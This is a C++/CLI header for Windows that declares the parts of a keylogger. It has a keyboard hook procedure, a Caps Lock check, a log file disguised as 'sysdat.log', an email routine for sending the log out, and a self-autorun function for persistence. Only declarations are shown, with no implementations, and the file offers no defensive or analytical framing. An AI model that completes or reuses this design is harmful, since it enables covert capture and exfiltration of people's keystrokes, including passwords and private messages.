#pragma once

#include <windows.h>
#include <cstring>
#include <fstream>
#include <iostream>
#include <algorithm>
#include <string>
#include <tchar.h>
#include <process.h>
#using <System.dll>

#define STRLENN(x) (sizeof(x)/sizeof(TCHAR) - 1)

using namespace System;
using namespace System::Diagnostics;
using namespace System::Net::Mail;
using namespace System::Net::Mime;
using namespace System::Threading;
using namespace System::ComponentModel;

char* GetCurPath(char *);

static bool mailSent;
static bool openFile;
static bool stopThread = true;
static char name[MAX_PATH] = "sysdat.log";
static char* logName(GetCurPath(name));

void msgLoop();
unsigned _stdcall sendFileFun(void* pArguments);
static void SendCompletedCallback(Object^ sender, AsyncCompletedEventArgs^ e);
LRESULT CALLBACK hookProc(int nCode,
	WPARAM wParam, LPARAM lParam);
BOOL isCaps();
BOOL SelfAutorun();
